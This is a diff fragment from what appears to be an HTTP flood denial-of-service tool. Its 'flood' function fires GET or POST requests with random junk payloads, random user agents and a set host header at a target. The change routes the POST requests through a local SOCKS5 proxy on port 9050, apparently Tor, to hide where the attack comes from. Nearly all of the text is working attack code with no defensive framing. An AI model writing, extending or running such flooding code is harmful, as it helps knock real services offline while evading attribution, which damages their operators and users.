@@ -23,13 +23,13 @@ def flood(target,domainname,attack):
     "User-agent": random.choice(user_agents),"host":domainname,
     }
     payload = str(random._urandom(random.randint(10, 150)))
-    
+    proxies = {'http': "socks5://127.0.0.1:9050"}
     
     try:
         if attack =='get':
             r = requests.get(target, params=payload, headers=headers, timeout=20 ,verify=False)
         else:
-            r = requests.post(target,params=payload ,headers=headers, timeout=20 , verify=False)
+            r = requests.post(target,params=payload ,headers=headers, timeout=20 , verify=False,proxies=proxies)
     except requests.exceptions.ConnectTimeout:
         print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out{Fore.RESET}")
     except Exception as e:
